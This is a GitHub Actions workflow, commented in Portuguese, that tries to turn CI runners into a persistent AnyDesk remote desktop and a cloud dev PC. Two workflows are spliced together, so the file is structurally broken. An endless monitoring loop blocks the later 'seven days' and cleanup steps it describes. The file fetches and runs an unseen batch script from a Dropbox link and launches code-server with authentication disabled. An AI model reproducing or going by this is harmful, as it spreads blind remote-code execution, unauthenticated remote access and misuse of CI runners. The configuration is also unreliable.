name: Windows Cloud PC - Anydesk (Optimized)

on:
  workflow_dispatch:

jobs:
  build:
    name: Start Building...
    runs-on: windows-latest
    timeout-minutes: 10080  # Máximo de 7 dias para evitar tempo de execução excessivo

    steps:
      - name: Downloading & Installing Essentials
        run: |
          # Baixa o arquivo .bat para instalar componentes essenciais
          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/7eiczvgil84czu55dxep3/Downloads.bat?rlkey=wzdc1wxjsph2b7r0atplmdz3p&dl=1" -OutFile "Downloads.bat"
          # Executa o script .bat para instalar os componentes
          cmd /c Downloads.bat

      - name: Log In To AnyDesk
        run: |
          # Verifica se o arquivo start.bat existe antes de executar
          if (Test-Path "start.bat") {
            cmd /c start.bat
          } else {
            Write-Host "Arquivo start.bat não encontrado. Verifique a configuração."
          }

      - name: Monitor and Restart AnyDesk if Needed
        run: |
          # Monitora a conexão do AnyDesk e reinicia se necessário
          while ($true) {
            $process = Get-Process -Name "AnyDesk" -ErrorAction SilentlyContinue
            if (-not $process) {
              Write-Host "AnyDesk não está rodando, reiniciando..."
              cmd /c start.bat
            }
            Start-Sleep -Seconds 300  # Verifica a cada 5 minutos
          }

      - name: Time Counter (Long Running Task)
        run: |
          # Configura para manter a máquina em execução
          Start-Sleep -Seconds 604800  # 7 dias de execução contínua

      - name: Clean Up Temporary Files
        if: success()  # Executa esta etapa apenas se todas as etapas anteriores forem bem-sucedidas
        run: |
          # Remove arquivos temporários ou logs gerados
          Remove-Item Downloads.bat -Force
          Write-Host "Limpeza completa."
  workflow_dispatch:

jobs:
  build:
    name: Booting GitHub Cloud Dev PC
    runs-on: windows-latest
    timeout-minutes: 10080  # 7 dias

    steps:
      - name: Baixar e Instalar Git
        run: |
          Invoke-WebRequest -Uri "https://github.com/git-for-windows/git/releases/download/v2.44.0.windows.1/Git-2.44.0-64-bit.exe" -OutFile "git-installer.exe"
          Start-Process .\git-installer.exe -ArgumentList "/VERYSILENT" -Wait

      - name: Instalar Node.js (LTS)
        run: |
          Invoke-WebRequest -Uri "https://nodejs.org/dist/v18.17.1/node-v18.17.1-x64.msi" -OutFile "node-installer.msi"
          Start-Process msiexec.exe -ArgumentList "/i node-installer.msi /quiet /norestart" -Wait

      - name: Instalar Python 3
        run: |
          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe" -OutFile "python-installer.exe"
          Start-Process python-installer.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait

      - name: Instalar Docker Desktop (Opcional)
        run: |
          Invoke-WebRequest -Uri "https://desktop.docker.com/win/main/amd64/Docker%20Desktop%20Installer.exe" -OutFile "docker-installer.exe"
          Start-Process .\docker-installer.exe -ArgumentList "install --quiet" -Wait

      - name: Clonar Repositório do GitHub
        run: |
          git clone https://github.com/SEU_USUARIO/SEU_REPOSITORIO.git

      - name: Instalar VSCode Server (opcional)
        run: |
          Invoke-WebRequest -Uri "https://github.com/coder/code-server/releases/download/v4.21.1/code-server-4.21.1-win-x64.zip" -OutFile "code-server.zip"
          Expand-Archive code-server.zip -DestinationPath "./vscode"
          cd vscode
          Start-Process ".\code-server.exe" -ArgumentList "--auth none" -NoNewWindow

      - name: Manter Sessão Ativa
        run: |
          while ($true) {
            Write-Output "GitHub Cloud Dev PC ativo em $(Get-Date -Format 'u')"
            Start-Sleep -Seconds 600  # Mantém a execução a cada 10 min
          }

      - name: Limpeza Final
        if: success()
        run: |
          Remove-Item *.exe, *.msi, *.zip -Force
          Write-Host "Ambiente limpo e finalizado."
